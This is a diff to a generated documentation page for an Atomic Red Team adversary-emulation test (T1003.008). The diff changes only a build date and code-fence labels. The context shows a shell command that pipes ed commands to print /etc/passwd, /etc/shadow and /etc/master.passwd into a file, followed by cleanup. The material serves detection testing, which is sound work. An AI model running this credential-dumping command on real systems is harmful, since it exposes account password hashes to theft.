@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.008"
 attack_technique_name: "OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.008/T1003.008.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "df1a55ae-019d-4120-bc35-94f4bc5c4b0a"
@@ -52,14 +52,14 @@ Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed
 
 ### Command
 
-```sh
+```bash
 unamestr=$(uname)
 if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > #{output_file}; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > #{output_file}; fi
 ```
 
 ### Cleanup
 
-```sh
+```bash
 rm -f #{output_file}
 ```
 
